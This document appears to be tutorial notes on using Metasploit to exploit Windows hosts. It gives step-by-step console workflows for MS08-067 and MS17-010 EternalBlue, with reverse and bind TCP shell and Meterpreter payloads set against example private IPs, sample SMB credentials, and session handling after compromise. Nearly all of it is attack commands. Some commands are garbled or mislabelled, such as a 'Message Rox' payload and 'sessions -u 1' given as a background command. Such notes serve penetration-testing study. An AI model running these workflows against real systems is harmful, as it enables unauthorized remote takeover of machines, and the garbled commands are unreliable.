## Active Exploits
Active exploits directly attack a target host the moment you run them.

### Key Characteristics
- They immediately launch the exploit.
- Require direct connection to the target.
- Stop on error or successful exploitation.
- Commonly used in server-side attacks (e.g., SMB, RPC, FTP, SSH, etc.).

### Example: Running an Active Exploit

**Load the module**

    use exploit/windows/smb/ms08_067_netapi


**Set target options**

    set RHOSTS 192.168.1.10
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.5


**Run the exploit**

    exploit

---

## Passive Exploits

Passive exploits wait for victims to connect. Useful for client-side attacks such as browser, PDF, media players, etc.

### Key Characteristics
- Do not actively attack anyone.
- Host a malicious service/page.
- Trigger when the victim interacts.
- Ideal for social engineering or drive-by attacks.

### Example: Browser-based Passive Exploit

**Load the exploit**

    use exploit/windows/browser/ms07_017_ani_loadimage_chunksize


**Show required options**

    show options


**Run the malicious server**

    exploit

*Victim triggers the exploit when their browser loads the malicious page.*

---

## Working with Sessions
After successful exploitation, Metasploit opens a session (shell or Meterpreter).

**List active sessions**

    sessions -l


**Interact with a session**

    sessions -i 1


**Background a session**

    background

*or from console:*

    sessions -u 1

**Upgrade shell → Meterpreter**

    sessions -u 1


---

## Useful Commands for Exploit Workflow

**Check if the module is likely to work**

    check


**Show module info**

    info


**Search for exploits**

    search smb
    search firefox


**Set options**

    set RHOSTS <target>
    set RPORT <port>
    set PAYLOAD <payload>


**Show advanced settings**

    show advanced

# MS08-067 NetAPI Exploitation Workflow

### 1. Load the Exploit Module

    use exploit/windows/smb/ms08_067_netapi


### 2. View Required Options

    show options


### 3. Set Target Hosts
**Single target:**

    set RHOSTS 192.168.1.247

**Multiple hosts from file:**

    set RHOSTS file:/home/root/Documents/hostlist.txt

### 4. Select a Payload
**Reverse TCP shell:**

    set PAYLOAD windows/shell/reverse_tcp

**Bind TCP shell:**

    set PAYLOAD windows/shell_bind_tcp
    set LPORT 4455


*(If using reverse TCP, also set LHOST.)*

### 5. Run a Vulnerability Check

    check


### 6. Exploit the Target
**Standard exploit:**
  
    exploit

**Run in background (as a job):**

    exploit -j


### 7. Work With Hosts

Load hosts from the database into the current module:

    hosts -R


### 8. Review Options Again

    show options


### 9. Exploit Again After Changes

    check

    exploit


### 10. Manage Sessions
**List active sessions:**

    sessions -l

**Interact with session ID 1:**

    sessions -i 1


### 11. Switching Payloads
*(Incomplete text in source image)*

---

# Summary Table: Active vs. Passive Exploits

| Feature              | Active Exploits                  | Passive Exploits                   |
| -------------------- | -------------------------------- | ---------------------------------- |
| **Attack Flow**      | Direct attack                    | Wait for victim                    |
| **Requires Target IP** | Yes                              | No (in many cases)                 |
| **Example**          | MS08-067 SMB exploit             | Browser-based ANICursor exploit    |
| **Useful For**       | Server-side                      | Client-side                        |
| **Launch Type**      | Immediate                        | Event-triggered                    |


## Switching Payloads

### Bind TCP


    set PAYLOAD windows/shell_bind_tcp

### Reverse TCP


    set PAYLOAD windows/shell_reverse_tcp

### Another format


    set PAYLOAD windows/shell/bind_tcp
    set PAYLOAD windows/shell/reverse_tcp

# MS17-010 (EternalBlue) – Workflow

### 1. Scan for MS17-010 Vulnerability

**Load the MS17-010 SMB Scanner**
```
use auxiliary/scanner/smb/smb_ms17_010
```

**Load hosts from database**
```
hosts -R
```

**Show required options**
```
show options
```

**Run the scanner**
```
run
```

**Optional: Provide SMB Credentials (if required)**

**Set SMB username/password**
```
set SMBUser armour
set SMBPass @rmour123
```

**OR use Administrator credentials**
```
set SMBUser Administrator
set SMBPass @rmour123
```

*Run scan again (if needed)*
```
run
```

### 2. Exploit MS17-010 EternalBlue

**Load the exploit module**
```
use exploit/windows/smb/ms17_010_eternalblue
```

**Show options**
```
show options
```

**Load hosts into the module (optional)**
```
hosts -R
```

**Run vulnerability check**
```
check
```

### 5. Manual Exploitation Against a Single Target

**Load module again (optional)**
```
use exploit/windows/smb/ms17_010_eternalblue
```

**Set the target host**
```
set RHOST 192.168.1.31
```

**Set the payload**
```
set PAYLOAD windows/x64/shell/reverse_tcp
```

**Show options**
```
show options
```

### 6. Select Correct Target (If Needed)

**Show targets**
```
show targets
```

**Example: choose target 6**
```
set target 6
```

### 7. Run Exploit

```
exploit
```

### 8. Other Payload Examples

**MessageBox payload**
```
set payload windows/x64/messagebox
```

**Select Payload**

*Common reverse shell payload (x64)*
```
set PAYLOAD windows/x64/shell/reverse_tcp
```

**Show options again**
```
show options
```

**Run the Exploit**
```
exploit
```

### Other Payload Exploit

- Message Rox Payload

      set payload windows/x64/messages

- Command execution payload

      set payload windows/x64/exec
